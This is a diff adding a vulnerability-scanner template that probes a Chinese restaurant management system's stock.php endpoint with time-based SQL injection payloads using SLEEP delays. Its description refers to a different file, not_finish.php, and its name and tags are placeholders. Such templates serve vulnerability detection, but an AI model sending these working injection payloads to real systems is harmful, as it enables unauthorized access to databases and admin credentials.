@@ -1,0 +1,22 @@
+id: ysyszhcy-stock-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 喰星云·数字化餐饮服务系统 not_finish.php 接口处存在SQL注入漏洞，未经身份验证的远程攻击者可利用此漏洞读取后台管理员账号密码登录凭证信息，导致后台权限被控，造成信息泄露，使系统处于极不安全的状态。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%96%B0%E6%98%9F%E4%BA%91-%E6%95%B0%E5%AD%97%E5%8C%96%E9%A4%90%E9%A5%AE%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9Fnot_finish.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/logistics/home_warning/php/stock.php?do=getList&lsid=1%20AND%20(SELECT%205538%20FROM%20(SELECT(SLEEP(3)))qXaU)"
+      - "{{BaseURL}}/logistics/home_warning/php/stock.php?do=getList&lsid=1%20AND%20(SELECT%205538%20FROM%20(SELECT(SLEEP(6)))qXaU)"
+      - "{{BaseURL}}/logistics/home_warning/php/stock.php?do=getList&lsid=1%20AND%20(SELECT%205538%20FROM%20(SELECT(SLEEP(9)))qXaU)"
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
